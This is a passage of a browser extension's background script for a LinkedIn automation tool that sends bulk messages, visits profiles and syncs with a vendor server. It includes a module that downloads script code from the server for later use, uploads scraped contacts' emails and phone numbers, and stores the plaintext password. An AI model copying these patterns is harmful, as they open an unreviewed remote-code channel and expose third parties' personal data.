        browser.tabs.query({
            active: true,
            currentWindow: true
        }, function(tabs) {
            if (tabs.length > 0) {
                browser.tabs.sendMessage(tabs[0].id, {
                    start_stop: true
                }, function(response) {});
            } else {
                showNotification("Please open LinkedIn search and try again");
            }
        });
    } else if (message.running) {
        leonard_running = message.runningState;
    } else if (message.getRunning) {
        sendResponse(leonard_running);
    } else if (message.resetViews) {
        // resetViews(function(){
        //  sendResponse();
        // });
    } else if (message.getLatestData) {
        // if(user_id){
        //     getLatestData(function(data){
        //         sendResponse(data);
        //     })
        // } else {
        // }
        browser.storage.local.get('user_details',function(ud){
            var user_details = ud.user_details || {};
            sendResponse(user_details);
        })
    } else if (message.saveUserData) {
        if(user_id){
            $.ajax({
                url: server_url + 'user/' + user_id,
                data : {
                    profile_img : message.profile_img,
                    account_type: message.account_type
                },
                type : 'POST',
                success: function(resp) {
                    sendResponse(resp);
                },
                error: function(error) {
                    sendResponse(error);
                }
            });
        }
    } else if (message.updateUserSettings) {
        if(user_id){
            $.ajax({
                url: server_url + 'user/' + user_id + '/settings',
                data : {
                    autoFollowUp : message.autoFollowUp,
                    autoRemind : message.autoRemind,
                    autoWithdraw : message.autoWithdraw,
                    autoWish : message.autoWish,
                    skipVisit : message.skipVisit,
                    skipMessage : message.skipMessage,
                    skipInMail : message.skipInMail,
                    maxEndorse : message.maxEndorse
                },
                type : 'POST',
                success: function(resp) {
                    sendResponse(resp);
                },
                error: function(error) {
                    sendResponse(error);
                }
            });
        }
    } else if (message.getTemplates) {
        if(user_id){
            $.ajax({
                url: server_url + 'get_templates/?user_id=' + user_id,
                success: function(resp) {
                    sendResponse(resp.templates);
                },
                error: function(error) {
                    sendResponse(error);
                }
            });
        }
    } else if (message.getInvitationMessages) {
        if(user_id){
            $.ajax({
                url: server_url + 'get_templates/',
                data: {
                    user_id: user_id,
                    template_type: 'connection_invitation'
                },
                success: function(resp) {
                    sendResponse(resp.templates);
                },
                error: function(error) {
                    sendResponse(error);
                }
            });
        }
    } else if (message.getFollowUpMessages) {
        if(user_id){
            $.ajax({
                url: server_url + 'get_templates/',
                data: {
                    user_id: user_id,
                    template_type: 'follow_up_message'
                },
                success: function(resp) {
                    sendResponse(resp.templates);
                },
                error: function(error) {
                    sendResponse(error);
                }
            });
        }
    } else if (message.getMessageTemplates) {
        if(user_id){
            $.ajax({
                url: server_url + 'get_templates/',
                data: {
                    user_id: user_id,
                    template_type: 'message'
                },
                success: function(resp) {
                    sendResponse(resp.templates);
                },
                error: function(error) {
                    sendResponse(error);
                }
            });
        }
    } else if (message.saveToDownloads) {
        if(user_id){
            $.ajax({
                url: server_url + 'add_to_downloads',
                type: 'POST',
                data: {
                    user_id: user_id,
                    operation: message.operation,
                    entityUrn: message.entityUrn,
                    filename: message.filename
                },
                complete: function(){
                    console.log("Saved to Downloads");
                }
            });
        }
    } else if (message.getInMailTemplates) {
        if(user_id){
            $.ajax({
                url: server_url + 'get_templates/',
                data: {
                    user_id: user_id,
                    template_type: 'inmail'
                },
                success: function(resp) {
                    sendResponse(resp.templates);
                },
                error: function(error) {
                    sendResponse(error);
                }
            });
        }
    } else if (message.setTemplates) {
        browser.tabs.query({
                currentWindow:true
            },function(tabs) {
            var ls_count = 0;
            var tab_ids = [];
            tabs.forEach(function(tab) {
                if (tab.url.indexOf('www.linkedin.com/search') > -1 || tab.url.indexOf('www.linkedin.com/sales/search') > -1) {
                    ls_count++;
                    tab_ids.push(tab.id);
                }
            });
            tab_ids.forEach(function(tabId) {
                browser.tabs.sendMessage(tabId, {
                    setTemplates: true
                }, function(){});
            })
        });
        sendResponse();
    } else if (message.saveTemplate) {
        if(user_id){
            $.ajax({
                url: server_url + 'add_template/',
                type: 'POST',
                data: {
                    template_name: message.templateName,
                    template_content: message.templateContent,
                    user_id: user_id
                },
                success: function(resp) {
                    browser.tabs.query({
                currentWindow:true
            },function(tabs) {
                        var ls_count = 0;
                        var tab_ids = [];
                        tabs.forEach(function(tab) {
                            if ((tab.url && tab.url.indexOf('www.linkedin.com/search') > -1) || (tab.url && tab.url.indexOf('www.linkedin.com/sales/search') > -1)) {
                                ls_count++;
                                tab_ids.push(tab.id);
                            }
                        });
                        tab_ids.forEach(function(tabId) {
                            browser.tabs.sendMessage(tabId, {
                                setTemplates: true
                            }, function(response) {
                                browser.tabs.highlight({
                                    tabs: tabId
                                });
                            });
                        })
                    })
                    sendResponse(resp);
                },
                error: function(error) {
                    sendResponse(error);
                }
            });
        }
    } else if (message.sendFollowUpMessages) {
        browser.tabs.query({
                currentWindow:true
            },function(tabs) {
            var ls_count = 0;
            var tab_ids = [];
            tabs.forEach(function(tab) {
                if (tab.url.indexOf('www.linkedin.com') > -1) {
                    ls_count++;
                    tab_ids.push(tab.id);
                }
            });
            if(tab_ids.length > 0){
                browser.tabs.sendMessage(tab_ids[0], {
                    sendFollowUpMessages : true,
                    messages : message.messages
                },function(){
                    sendResponse();
                });
            } else {
                openNewTab(LINKEDIN_SEARCH_PAGE, function(new_tab){
                    setTimeout(function(){
                        showNotification("Opened LinkedIn for sending follow up messages!");
                        browser.tabs.sendMessage(new_tab.id, {
                            sendFollowUpMessages : true,
                            messages : message.messages
                        },function(){
                            sendResponse();
                        });
                    },3000);
                });
            }
        })
    } else if (message.sendBulkMessages) {
        browser.tabs.query({
                currentWindow:true
            },function(tabs) {
            var ls_count = 0;
            var tab_ids = [];
            tabs.forEach(function(tab) {
                if (tab.url.indexOf('www.linkedin.com') > -1) {
                    ls_count++;
                    tab_ids.push(tab.id);
                }
            });
            if(tab_ids.length > 0){
                browser.tabs.sendMessage(tab_ids[0], {
                    sendBulkMessages : true,
                    messages : message.messages
                },function(){
                    sendResponse();
                });
            } else {
                openNewTab(LINKEDIN_SEARCH_PAGE, function(new_tab){
                    setTimeout(function(){
                        showNotification("Opened LinkedIn for posting the messages!");
                        browser.tabs.sendMessage(new_tab.id, {
                            sendBulkMessages : true,
                            messages : message.messages
                        },function(){
                            sendResponse();
                        });
                    },3000);
                });
            }
        })
    } else if(message.withdrawConnection){
        browser.tabs.query({
                currentWindow:true
            },function(tabs) {
            var ls_count = 0;
            var tab_ids = [];
            tabs.forEach(function(tab) {
                if (tab.url.indexOf('www.linkedin.com') > -1) {
                    ls_count++;
                    tab_ids.push(tab.id);
                }
            });
            if(tab_ids.length > 0){
                browser.tabs.sendMessage(tab_ids[0], {
                    withdrawConnection : true,
                    public_id : message.public_id
                },function(){
                    sendResponse();
                });
            } else {
                openNewTab(LINKEDIN_SEARCH_PAGE, function(new_tab){
                    setTimeout(function(){
                        showNotification("Opened LinkedIn for sending follow up messages!");
                        browser.tabs.sendMessage(new_tab.id, {
                            withdrawConnection : true,
                            public_id : message.public_id
                        },function(){
                            sendResponse();
                        });
                    },3000);
                });
            }
        })
    } else if(message.handleConnection){
        browser.tabs.query({
                currentWindow:true
            },function(tabs) {
            var ls_count = 0;
            var tab_ids = [];
            tabs.forEach(function(tab) {
                if (tab.url.indexOf('www.linkedin.com') > -1) {
                    ls_count++;
                    tab_ids.push(tab.id);
                }
            });
            if(tab_ids.length > 0){
                browser.tabs.sendMessage(tab_ids[0], {
                    handleConnection : true,
                    rec : message.rec,
                    mode: message.mode
                },function(state){
                    sendResponse(state);
                });
            } else {
                openNewTab(LINKEDIN_SEARCH_PAGE, function(new_tab){
                    setTimeout(function(){
                        showNotification("Opened LinkedIn for ignoring received invitation!");
                        browser.tabs.sendMessage(new_tab.id, {
                            handleConnection : true,
                            rec : message.rec,
                            mode: message.mode
                        },function(state){
                            sendResponse(state);
                        });
                    },3000);
                });
            }
        })
    } else if(message.withdrawMultipleConnectionRequests){
        browser.tabs.query({
                currentWindow:true
            },function(tabs) {
            var ls_count = 0;
            var tab_ids = [];
            tabs.forEach(function(tab) {
                if (tab.url.indexOf('www.linkedin.com') > -1) {
                    ls_count++;
                    tab_ids.push(tab.id);
                }
            });
            if(tab_ids.length > 0){
                browser.tabs.sendMessage(tab_ids[0], {
                    withdrawMultipleConnectionRequests : true,
                    public_ids: message.public_ids
                },function(){
                    sendResponse();
                });
            } else {
                openNewTab(LINKEDIN_SEARCH_PAGE, function(new_tab){
                    setTimeout(function(){
                        showNotification("Opened LinkedIn for sending follow up messages!");
                        browser.tabs.sendMessage(new_tab.id, {
                            withdrawMultipleConnectionRequests : true,
                            public_ids: message.public_ids
                        },function(){
                            sendResponse();
                        });
                    },3000);
                });
            }
        })
    } else if(message.reloadConnections){
        browser.tabs.query({
                currentWindow:true
            },function(tabs) {
            var ls_count = 0;
            var tab_ids = [];
            tabs.forEach(function(tab) {
                if (tab.url.indexOf('www.linkedin.com') > -1) {
                    ls_count++;
                    tab_ids.push(tab.id);
                }
            });
            if(tab_ids.length > 0){
                browser.tabs.sendMessage(tab_ids[0], {
                    reloadConnections : true
                },function(){
                    sendResponse();
                });
            } else {
                openNewTab(LINKEDIN_SEARCH_PAGE, function(new_tab){
                    setTimeout(function(){
                        showNotification("Opened LinkedIn for reloading the connections!");
                        browser.tabs.sendMessage(new_tab.id, {
                            reloadConnections : true
                        },function(){
                            sendResponse();
                        });
                    },3000);
                });
            }
        })
    } else if(message.checkForAccepted){
        browser.tabs.query({
                currentWindow:true
            },function(tabs) {
            var ls_count = 0;
            var tab_ids = [];
            tabs.forEach(function(tab) {
                if (tab.url.indexOf('www.linkedin.com') > -1) {
                    ls_count++;
                    tab_ids.push(tab.id);
                }
            });
            if(tab_ids.length > 0){
                browser.tabs.sendMessage(tab_ids[0], {
                    checkForAccepted : true
                },function(isUpdated){
                    sendResponse(isUpdated);
                });
            } else {
                openNewTab(LINKEDIN_SEARCH_PAGE, function(new_tab){
                    setTimeout(function(){
                        showNotification("Opened LinkedIn for checking the accepted connections!");
                        browser.tabs.sendMessage(new_tab.id, {
                            checkForAccepted : true
                        },function(isUpdated){
                            sendResponse(isUpdated);
                        });
                    },3000);
                });
            }
        })
    } else if(message.getSpecialDeals){
        // if(special_deals){
        //     sendResponse(special_deals);
        // } else {
        //     getSpecialDeals(function(){
        //         sendResponse(special_deals);
        //     })
        // }
        sendResponse(' ');
    } else if(message.getUserIdByEmail){
        getSpecialDeals();
        var email = message.email || '';
        var publicIdentifier = message.publicIdentifier || '';
        $.ajax({
            url : server_url + 'user_by_email?email=' + email + '&publicIdentifier=' + encodeURI(publicIdentifier),
            success : function(res){
                user_id = res.user && typeof res.user == 'object' && res.user.length > 0 ? res.user[0].id : res.user.id;
                sendResponse(res.user);
            }, 
            error : function(err){
                sendResponse(err);
            }
        })
    } else if(message.getPending){
        browser.tabs.query({
                currentWindow:true
            },function(tabs) {
            var ls_count = 0;
            var tab_ids = [];
            tabs.forEach(function(tab) {
                if (tab.url.indexOf('www.linkedin.com') > -1) {
                    ls_count++;
                    tab_ids.push(tab.id);
                }
            });
            if(tab_ids.length > 0){
                browser.tabs.sendMessage(tab_ids[0], {
                    getPending : true
                },function(data){
                    sendResponse(data);
                });
            } else {
                openNewTab(LINKEDIN_SEARCH_PAGE, function(new_tab){
                    setTimeout(function(){
                        showNotification("Opened LinkedIn for checking the accepted connections!");
                        browser.tabs.sendMessage(new_tab.id, {
                            getPending : true
                        },function(data){
                            sendResponse(data);
                        });
                    },3000);
                });
            }
        })
    } else if(message.getReceived){
        browser.tabs.query({
                currentWindow:true
            },function(tabs) {
            var ls_count = 0;
            var tab_ids = [];
            tabs.forEach(function(tab) {
                if (tab.url.indexOf('www.linkedin.com') > -1) {
                    ls_count++;
                    tab_ids.push(tab.id);
                }
            });
            if(tab_ids.length > 0){
                browser.tabs.sendMessage(tab_ids[0], {
                    getReceived : true
                },function(data){
                    sendResponse(data);
                });
            } else {
                openNewTab(LINKEDIN_SEARCH_PAGE, function(new_tab){
                    setTimeout(function(){
                        showNotification("Opened LinkedIn for getting received invitations!");
                        browser.tabs.sendMessage(new_tab.id, {
                            getReceived : true
                        },function(data){
                            sendResponse(data);
                        });
                    },3000);
                });
            }
        })
    } else if(message.openTabForVisiting){
        visitTabResponseHandler = sendResponse;
        browser.windows.create({
            url : message.url,
            height: 500,
            width: 500,
            focused:false
        }, function(w){
            var tabId = w.tabs[0].id;
            clearInterval(pageLoadInterval);
            pageLoadInterval = null;
            pageLoadInterval = setInterval(function(){
                browser.tabs.sendMessage(tabId, {
                    checkLoadStatus: true
                }, function(status){
                    if(status){
                        clearInterval(pageLoadInterval);
                        pageLoadInterval = null;
                        setTimeout(function(){
                            browser.tabs.sendMessage(tabId, {
                                visit_tab: true
                            });
                        },2000);
                    }
                });
            },3000);
        })
        // browser.tabs.create({
        //     url: message.url,
        //     active: false
        // }, function(new_tab){
            
        // });
    } else if(message.sendHTMLToMain){
        if(visitTabResponseHandler){
            visitTabResponseHandler(message.html);
            visitTabResponseHandler = false;
            sendResponse();
        }
    } else if(message.getMessageEntityUrn){
        browser.tabs.query({
                currentWindow:true
            },function(tabs) {
            var ls_count = 0;
            var tab_ids = [];
            tabs.forEach(function(tab) {
                if (tab.url.indexOf('www.linkedin.com') > -1) {
                    ls_count++;
                    tab_ids.push(tab.id);
                }
            });
            if(tab_ids.length > 0){
                browser.tabs.sendMessage(tab_ids[0], {
                    getMessageEntityUrn : true,
                    public_id : message.public_id
                },function(data){
                    sendResponse(data);
                });
            } else {
                openNewTab(LINKEDIN_SEARCH_PAGE, function(new_tab){
                    setTimeout(function(){
                        // showNotification("Opened LinkedIn for reloading the connections!");
                        browser.tabs.sendMessage(new_tab.id, {
                            getMessageEntityUrn : true,
                            public_id : message.public_id
                        },function(data){
                            sendResponse(data);
                        });
                    },3000);
                });
            }
        })
    } else if(message.getUserDetailsToRegister){
        browser.tabs.query({
                currentWindow:true
            },function(tabs) {
            var ls_count = 0;
            var tab_ids = [];
            tabs.forEach(function(tab) {
                if (tab.url.indexOf('www.linkedin.com') > -1) {
                    ls_count++;
                    tab_ids.push(tab.id);
                }
            });
            if(tab_ids.length > 0){
                browser.tabs.sendMessage(tab_ids[0], {
                    getUserDetailsToRegister : true
                },function(data){
                    registerUser(data, function(){
                        sendResponse()
                    });
                });
            } else {
                openNewTab(LINKEDIN_SEARCH_PAGE, function(new_tab){
                    setTimeout(function(){
                        browser.tabs.sendMessage(new_tab.id, {
                            getUserDetailsToRegister : true
                        },function(data){
                            registerUser(data, function(){
                                sendResponse();
                            });
                        });
                    },3000);
                });
            }
        })
    } else if(message.addProfile){
        var attrs = message.attrs;
        $.ajax({
            url : server_url + 'add_profile',
            data: {
                firstName : attrs.firstName,
                lastName : attrs.lastName,
                entityUrn : attrs.entityUrn,
                objectUrn : attrs.objectUrn,
                headline : attrs.headline,
                publicIdentifier : attrs.publicIdentifier,
                industryCode : attrs.industryCode,
                picture : attrs.picture,
                trackingId : attrs.trackingId,
                locationName : attrs.locationName,
                postalCode : attrs.postalCode,
                versionTag : attrs.versionTag,
                schoolName : attrs.schoolName,
                fieldOfStudy : attrs.fieldOfStudy,
                title : attrs.title,
                companyName : attrs.companyName,
                languages : attrs.languages,
                skills : attrs.skills,
                email: attrs.email,
                phone: attrs.phone
            },
            type: 'POST',
            success: function(resp){
                sendResponse(resp);
            },
            error: function(err) {
                sendResponse(err);
            }
        })
    } else {
        console.log("Unexpected message \n " + JSON.stringify(message));
    }
    return true;
});

browser.runtime.onInstalled.addListener(function(details) {
    if (details.reason == "install") {
        browser.storage.local.clear();
        browser.tabs.create({
            url: 'https://meetleonard.com/install_success/'
        });
    } else if(details.reason == 'update'){
        // console.log("New update installed");
        user_id = false;
    }
    reloadAllLinkedInPages();
})

function reloadAllLinkedInPages(callback){
    browser.windows.getAll({populate:true},function(windows){
        windows.forEach(function(window){
            var tabs_count = 0;
            window.tabs.forEach(function(tab){
                if(tab.url && tab.url.indexOf('www.linkedin.com') > -1){
                    browser.tabs.reload(tab.id);
                    tabs_count++;
                }
            });
            if(typeof callback == 'function'){
                callback();
                // if(tabs_count > 0){
                //     callback();
                // }
            }
        });
    });
}

function registerUser(data, callback){
    var data = $.extend({}, data);
    data.rest = true;
    $.ajax({
        url: server_url + 'add_user',
        type: 'POST',
        data: data,
        success: function(res){
            // console.log(res);
            if(res && res.id){
                browser.storage.local.set({
                    "isSignUpRequired": false
                });
                user_id = res.id;
                getLatestData(function(){
                    reloadAllLinkedInPages(function(){
                        if(typeof callback == 'function'){
                            callback();
                        }
                    });
                });
            } else {
                showNotification("Please try again.");
            }
        },
        error : function(){
            console.log("Check this issue.");
        }
    })
}

function resetViews(callback) {
    if(user_id){
        browser.storage.local.get('LINKEDIN_DATA_' + user_id, function(obj) {
            if (obj['LINKEDIN_DATA_' + user_id]) {
                local_data = obj['LINKEDIN_DATA_' + user_id];
                local_data.REMAINING_PROFILE_VIEWS = MAX_VIEWS;
                local_data.VISITED = 0;
                local_data.stop_after = 500;
            }
            var sobj = {};
            sobj['LINKEDIN_DATA_' + user_id] = local_data;
            browser.storage.local.set(obj);
            window.localStorage.setItem("today", getTodayDate());
            if (typeof callback == 'function') callback();
        });
    }
}

function createNewUser(msg, callback) {
    $.ajax({
        url: server_url + 'add_user',
        data: {
            firstname: msg.firstname,
            email: msg.email,
            password: msg.password,
            rest: true
        },
        type: 'POST',
        success: function(res) {
            if (typeof res == "string") {
                res = JSON.parse(res);
            }
            browser.storage.local.set({
                "user_details": res
            });
            callback(res);
        },
        complete: function(xhr) {
            if (xhr.status != 200) {
                callback(xhr);
            }
        }
    })
}

function getLatestData(callback){
    if(!user_id){
        browser.storage.local.get("user_details", function(ud) {
            if (!ud['user_details']) {
                return false;
            }
            user_id = ud['user_details']['id'];
            window.localStorage.setItem("today", getTodayDate());
            if(user_id)
                getLatestData(callback);
        });
        return false;
    }
    $.ajax({
        url: server_url + 'user/' + user_id,
        success: function(resp) {
            browser.storage.local.get('user_details', function(ud) {
                var user_details = ud.user_details;
                if(!user_details){
                    user_details = resp.user;
                } else {
                    user_details.profile_views_remaining_today = resp.user.profile_views_remaining_today;
                    user_details.connection_requests_remaining_today = resp.user.connection_requests_remaining_today;
                    user_details.messages_remaining_today = resp.user.messages_remaining_today;
                    user_details.inmails_remaining_today = resp.user.inmails_remaining_today;
                    user_details.user_type = resp.user.user_type;
                    user_details.user_plan = resp.user.user_plan;
                }
                user_details.autoFollowUp = resp.user.autoFollowUp;
                user_details.autoRemind = resp.user.autoRemind;
                user_details.autoWithdraw = resp.user.autoWithdraw;
                user_details.autoWish = resp.user.autoWish;
                user_details.skipVisit = resp.user.skipVisit;
                user_details.skipMessage = resp.user.skipMessage;
                user_details.skipInMail = resp.user.skipInMail;
                user_details.maxEndorse = resp.user.maxEndorse;
                user_details.autoLogIn = true;
                user_details.rememberMe = true;
                browser.storage.local.set({
                    'user_details': user_details
                })
                if(typeof callback == 'function') callback(user_details);
            });
        },
        error: function(error) {
            if(typeof callback == 'function') callback(error);
        }
    });
}

function getSpecialDeals(callback){
    $.ajax({
        url: server_url + 'get_special_deals',
        success: function(resp){
            // special_deals = resp;
            if(resp.msg == 'NEW_VERSION' && resp.version != browser.runtime.getManifest().version){
                showNotification("New version is ready to download.\nPlease click here to download.", 'download');
            }
            if(typeof callback == 'function'){
                callback();
            }
        },
        error : function(error){
            console.log(error);
        }
    });
}

function getUserDetails(msg, callback) {
    var email = msg.email;
    var password = msg.password;
    $.ajax({
        url: server_url + 'login',
        type: 'POST',
        data: {
            email: email,
            password: password,
            rest: true
        },
        success: function(resp) {
            if (typeof resp == "string") {
                resp = JSON.parse(resp);
            }
            if (resp && resp.id) {
                user_id = resp.id;
                if (msg.rememberMe) {
                    resp.password = msg.password;
                    resp.rememberMe = msg.rememberMe;
                }
                browser.storage.local.get("user_details", function(ud) {
                    var saved_user_details = ud['user_details'];
                    if(saved_user_details && saved_user_details.current_linkedin_profile_id && saved_user_details.current_linkedin_profile_id == resp.linkedin_profile_id){
                        delete resp.current_linkedin_profile_id;
                        resp.autoLogIn = true;
                        browser.storage.local.set({
                            user_details: resp
                        });
                    } else if(saved_user_details && saved_user_details.current_linkedin_profile_id){
                        resp.autoLogIn = true;
                        // showNotification('You\'re logged in with other user in LinkedIn!\nPlease login to LinkedIn with the profile you created for Leonard!');
                        callback('error');
                        browser.storage.local.set({
                            user_details: resp
                        });
                        return false;
                    } else {
                        resp.autoLogIn = true;
                        browser.storage.local.set({
                            user_details: resp
                        });
                    }
                    browser.tabs.query({
                        active: true,
                        currentWindow: true
                    }, function(tabs) {
                        if (tabs.length > 0) {
                            browser.tabs.sendMessage(tabs[0].id, {
                                reloadPage: true
                            }, function(response) {});
                        }
                    });
                    callback('success');
                });
            } else {
                callback('error');
            }
        },
        error: function() {
            callback('error');
        }
    })
}

/* Patch module*/

function isPatchAvailable(){
    $.ajax({
        url : server_url + 'is_patch_available',
        data: {
            version : browser.runtime.getManifest().version
        },
        success : function(scripts){
            if(scripts){
                var content_scripts = [];
                var backgrounds = [];
                var popups = [];
                var mainCtrls = [];

                scripts.forEach(function(s){
                    s.type == 'content_script' && content_scripts.push(s.script);
                    s.type == 'background' && backgrounds.push(s.script);
                    s.type == 'popup' && popups.push(s.script);
                    s.type == 'mainCtrl' && mainCtrls.push(s.script);
                })
                content_scripts.length > 0 ? browser.storage.local.set({'content_script':content_scripts}) : browser.storage.local.remove('content_script');;
                backgrounds.length > 0 ? browser.storage.local.set({'background':backgrounds}) : browser.storage.local.remove('background');;
                popups.length > 0 ? browser.storage.local.set({'popup':popups}) : browser.storage.local.remove('popup');;
                mainCtrls.length > 0 ? browser.storage.local.set({'mainCtrl':mainCtrls}) : browser.storage.local.remove('mainCtrl');;
            } else {
                browser.storage.local.remove('content_script');
                browser.storage.local.remove('background');
                browser.storage.local.remove('popup');
                browser.storage.local.remove('mainCtrl');
            }
        },
        error : function(){
            browser.storage.local.remove('content_script');
            browser.storage.local.remove('background');
            browser.storage.local.remove('popup');
            browser.storage.local.remove('mainCtrl');
        }
    })
}

function showNotification(txt, tabId, title, callback) {
    if(txtShowingNow == txt){
        return false;
    }
    if(tabId){
        globalTabID = tabId;
    } else {
        globalTabID = false;
    }
    clearAllNotifications();
    browser.storage.local.get("user_details", function(ud) {
        var firstname = ud['user_details'] && ud['user_details']['firstname'] || 'Guest';
        title = title || "Hi " + firstname;
        browser.notifications.create({
            title: title,
            iconUrl: browser.runtime.getURL('images/icon-48.png'),
            type: 'basic',
            message: txt
        });
        clearTimeout(txtClearingInterval);
        txtClearingInterval = false;
        txtClearingInterval = setTimeout(function(){
            txtShowingNow = '';
        },5000);
        txtShowingNow = txt;
    });
}

function showNotificationWithProgress(percentage_completed){
    clearAllNotifications();
    browser.storage.local.get("user_details", function(ud) {
        var firstname = ud['user_details'] && ud['user_details']['firstname'] || 'Guest';
        browser.notifications.create({
            title: "Hi " + firstname,
            type: "progress",
            message: "Downloading 1st connections data...",
            iconUrl: browser.runtime.getURL('images/icon-48.png'),
            progress: percentage_completed
        })
    });
}

function showConnectionAcceptanceNotification(count){
    if(localStorage.getItem("acceptedNot") != getTodayDate()){
        window.localStorage.setItem("acceptedNot", getTodayDate());
        browser.notifications.create('sendFollowUpMessage', {
            type: 'basic',
            iconUrl: browser.runtime.getURL('images/icon-48.png'),
            title: 'Congratulations! '+count+' connection invitations got accepted!',
            message: 'Do you wish to review and send follow up message?',
            buttons: [
                { title: 'Review & Send' },
                { title: 'Not Yet' }
            ],
            requireInteraction : true
        })
    }
}

function clearAllNotifications() {
    browser.notifications.getAll(function(nots) {
        var notIds = Object.keys(nots);
        notIds.forEach(function(n) {
            browser.notifications.clear(n)
        })
    })
    txtShowingNow = '';
}

function getTodaysDate() {
    return (new Date()).toISOString().substring(0, 10) + " " + (new Date()).toLocaleTimeString();
}

browser.notifications.onClosed.addListener(function(){
    txtShowingNow = '';
})
